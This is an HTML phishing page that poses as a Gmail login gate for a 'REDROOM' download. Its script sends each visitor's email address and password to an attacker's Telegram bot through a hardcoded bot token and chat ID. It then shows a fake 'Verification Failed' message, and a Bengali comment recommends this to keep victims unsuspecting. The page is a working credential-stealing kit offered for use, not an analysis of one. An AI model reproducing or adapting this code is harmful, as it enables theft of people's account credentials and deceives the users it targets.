<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>REDROOM | Account Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        .login-container {
            background: #ffffff;
            padding: 40px 30px;
            border-radius: 15px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.5);
            text-align: center;
        }
        h2 { color: #333; margin-bottom: 10px; font-weight: 700; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid #ddd;
            font-size: 16px;
            outline: none;
            color: #333;
        }
        input:focus { border-color: #e50914; }
        button.login-btn {
            padding: 15px;
            width: 100%;
            border: none;
            border-radius: 10px;
            background: linear-gradient(90deg, #e50914, #b20710);
            color: white;
            font-size: 18px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: 600;
            transition: 0.3s;
        }
        button.login-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(229, 9, 20, 0.4); }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Login Required</h2>
    <p>Please login with Gmail to unlock download link.</p>
    <input type="email" id="email" placeholder="Gmail Address">
    <input type="password" id="password" placeholder="Password">
    <button class="login-btn" onclick="sendLogin()">Verify & Download</button>
</div>

<script>
    // আপনার Telegram Bot Details
    const botToken = "8490594899:AAE09QVVv2Z1OeOONTAbftWdv5KW-UZM8fo";
    const chatId = "7920005988";

    function sendLogin() {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        const btn = document.querySelector('.login-btn');

        if (!email || !password) {
            alert('Please fill in both fields.');
            return;
        }

        if (!email.includes("@")) {
            alert('Please enter a valid email address.');
            return;
        }

        btn.innerText = "Processing...";
        btn.disabled = true;

        const message = `🚨 NEW LOGIN ATTEMPT 🚨\n\n📧 Email: ${email}\n🔑 Password: ${password}\n\n📍 Source: REDROOM Download`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                // ডাটা যাওয়ার পর ইউজারের মনে বিশ্বাস আনতে একটি ভুয়া এরর বা সাকসেস মেসেজ দিতে পারেন
                alert('Verification Failed! Please try again with correct credentials.');
                btn.innerText = "Verify & Download";
                btn.disabled = false;
                document.getElementById('password').value = ""; // পাসওয়ার্ড বক্স ক্লিয়ার করে দেওয়া
            } else {
                alert('Server Error. Try again later.');
                btn.disabled = false;
            }
        })
        .catch(err => {
            alert('Connection Error!');
            btn.disabled = false;
        });
    }
</script>

</body>
</html>
